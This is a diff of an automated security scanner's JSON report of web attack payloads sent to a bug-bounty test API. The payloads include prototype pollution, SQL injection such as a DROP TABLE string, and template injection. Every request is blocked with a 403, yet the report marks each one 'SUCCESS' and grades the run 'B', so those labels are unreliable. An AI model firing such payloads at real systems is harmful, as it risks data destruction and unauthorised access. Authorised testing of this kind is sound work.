+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d5f5ddb4e3ef\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d5f5ddb4e3ef-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:44"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "'; DROP TABLE users;--",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "contextual_api_2",
+          "mutation_strategy": "contextual",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "'; DROP TABLE users;--",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.549,
+            "content_length": 7100,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:46 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d6004e3ec9c4\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d6004e3ec9c4-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:46"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "{{config}}",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "contextual_api_3",
+          "mutation_strategy": "contextual",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "{{config}}",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.556,
+            "content_length": 7092,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:48 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d60b3bc1ca21\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d60b3bc1ca21-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:48"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "SUCCESSFUL_RESPONSE",
+            "severity": "INFO",
+            "description": "Uspešan response sa 76890 karaktera"
+          },
+          {
+            "type": "LARGE_RESPONSE",
+            "severity": "LOW",
+            "description": "Veliki response: 76890 karaktera"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      },
+      {
+        "attack_id": "3561e42c",
+        "payload": {
+          "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+          "method": "GET",
+          "payload": "'; WAITFOR DELAY '00:00:05'--",
+          "params": {},
+          "headers": {},
+          "source_type": "prototype_pollution",
+          "priority": "HIGH",
+          "success_indicators": [
+            "ADMIN_REFERENCE",
+            "NO_UNAUTHORIZED_ERROR"
+          ],
+          "priority_score": 16,
+          "mutation_type": "blind_1",
+          "mutation_strategy": "blind",
+          "original_payload": {
+            "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/admin",
+            "method": "GET",
+            "payload": {
+              "__proto__": {
+                "admin": true
+              }
+            },
+            "params": {},
+            "headers": {},
+            "source_type": "prototype_pollution",
+            "priority": "HIGH",
+            "success_indicators": [
+              "ADMIN_REFERENCE",
+              "NO_UNAUTHORIZED_ERROR"
+            ],
+            "priority_score": 16
+          },
+          "test_result": {
+            "payload_sent": "'; WAITFOR DELAY '00:00:05'--",
+            "status": "SUCCESS",
+            "status_code": 403,
+            "response_time": 0.689,
+            "content_length": 7182,
+            "response_headers": {
+              "Date": "Sun, 08 Jun 2025 10:51:50 GMT",
+              "Content-Type": "text/html; charset=UTF-8",
+              "Transfer-Encoding": "chunked",
+              "Connection": "close",
+              "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cf-mitigated": "challenge",
+              "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
+              "cross-origin-embedder-policy": "require-corp",
+              "cross-origin-opener-policy": "same-origin",
+              "cross-origin-resource-policy": "same-origin",
+              "origin-agent-cluster": "?1",
+              "permissions-policy": "accelerometer=(),autoplay=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
+              "referrer-policy": "same-origin",
+              "server-timing": "chlray;desc=\"94c7d618aed4e3e5\"",
+              "x-content-type-options": "nosniff",
+              "x-frame-options": "SAMEORIGIN",
+              "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
+              "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
+              "Vary": "Accept-Encoding",
+              "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+              "Server": "cloudflare",
+              "CF-RAY": "94c7d618aed4e3e5-OTP",
+              "Content-Encoding": "gzip"
+            },
+            "response_snippet": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetic",
+            "timestamp": "2025-06-08 10:51:50"
+          },
+          "ai_score": 4.0,
+          "ai_evaluation": {
+            "score": 4.0,
+            "confidence": "MEDIUM",
+            "risk_level": "MEDIUM",
+            "indicators": [],
+            "recommendation": "Manual review recommended - Interesting response patterns"
+          }
+        },
+        "method": "GET",
+        "url": "",
+        "status_code": 0,
+        "response_length": 0,
+        "response_time": 0,
+        "vulnerability_indicators": [
+          {
+            "type": "ACCESS_FORBIDDEN",
+            "severity": "LOW",
+            "description": "Access Forbidden - možda dosegnuto zaštićeno područje"
+          }
+        ],
+        "risk_level": "MEDIUM",
+        "confidence": 0.6
+      }
+    ],
+    "pattern_analysis": {
+      "encoding_patterns": {},
+      "bypass_techniques": {},
+      "common_vectors": {}
+    }
+  },
+  "risk_assessment": {
+    "overall_risk": "MEDIUM",
+    "risk_breakdown": {
       "CRITICAL": 0,
       "HIGH": 0,
-      "MEDIUM": 0,
-      "LOW": 0
+      "MEDIUM": 99,
+      "LOW": 1
     },
-    "attack_surface_summary": {
-      "total_parameters": 0,
-      "high_risk_count": 0,
-      "risk_ratio": 0.0
-    }
+    "vulnerability_types": {
+      "3561e42c": 100
+    },
+    "attack_surface_coverage": 0.01
   },
-  "attack_pattern_analysis": {
-    "temporal_patterns": {
-      "peak_vulnerability_times": [],
-      "response_time_correlation": {},
-      "attack_frequency_analysis": {}
-    },
-    "response_clustering": {
-      "error": "'ShadowAIEvaluator' object has no attribute 'attack_data'"
-    },
-    "payload_chains": {
-      "error": "'ShadowAIEvaluator' object has no attribute 'attack_data'"
-    },
-    "attack_vectors": {
-      "error": "'ShadowAIEvaluator' object has no attribute 'attack_data'"
-    },
-    "defensive_patterns": {
-      "error": "'ShadowAIEvaluator' object has no attribute 'attack_data'"
-    }
-  },
-  "improvement_recommendations": [
-    {
-      "category": "Payload Expansion",
-      "priority": "HIGH",
-      "description": "Insufficient effective payloads detected",
-      "specific_recommendations": [
-        "Add more context-specific payloads",
-        "Implement custom payload generation",
-        "Focus on application-specific injection vectors"
-      ],
-      "impact": "Increased vulnerability detection rate"
-    },
+  "recommendations": [
     {
       "category": "Coverage Improvement",
       "priority": "MEDIUM",
-      "description": "Identified gaps in attack coverage",
+      "description": "Limited attack surface coverage detected",
       "specific_recommendations": [
-        "Missing attack categories: xss_basic, path_traversal, sqli_basic, command_injection"
+        "Expand endpoint discovery",
+        "Test more parameter combinations",
+        "Include additional attack categories"
       ],
       "impact": "More comprehensive security assessment"
+    },
+    {
+      "category": "Attack Diversification",
+      "priority": "MEDIUM",
+      "description": "Missing attack categories: PATH_TRAVERSAL, CSRF",
+      "specific_recommendations": [
+        "Add PATH_TRAVERSAL payload templates",
+        "Add CSRF payload templates"
+      ],
+      "impact": "Broader vulnerability coverage"
     }
   ],
   "ai_scoring": {
-    "overall_mission_score": 3.5,
-    "completeness_factors": {
-      "recon_coverage": 10.0,
-      "attack_comprehensiveness": 0.0,
-      "vulnerability_confidence": 5.0,
-      "payload_effectiveness": 0.0
+    "total_score": 3.23,
+    "components": {
+      "payload_effectiveness": 1.4849999999999999,
+      "vulnerability_confidence": 0.993,
+      "attack_diversity": 0.75,
+      "coverage_score": 0.005
     },
-    "score_breakdown": {
-      "recon_coverage": 0.2,
-      "attack_comprehensiveness": 0.3,
-      "vulnerability_confidence": 0.3,
-      "payload_effectiveness": 0.2
-    },
-    "mission_grade": {
-      "grade": "F",
-      "description": "Incomplete security assessment"
-    },
-    "confidence_level": "LOW",
-    "recommended_next_steps": [
-      "Significantly expand reconnaissance phase",
-      "Increase payload diversity and volume",
-      "Review attack methodology and coverage"
-    ]
-  },
-  "false_positive_analysis": {},
-  "coverage_analysis": {},
-  "threat_intelligence": {},
-  "statistics": {
-    "evaluation_timestamp": "2025-06-07 11:44:58",
-    "total_attack_files_analyzed": 1,
-    "total_injection_tests_analyzed": 0,
-    "total_vulnerabilities_analyzed": 0,
-    "ai_evaluation_version": "ShadowFox AI v1.0",
-    "analysis_completeness": "COMPREHENSIVE"
+    "grade": "B",
+    "description": "Good security assessment with moderate vulnerabilities detected"
   }
 }
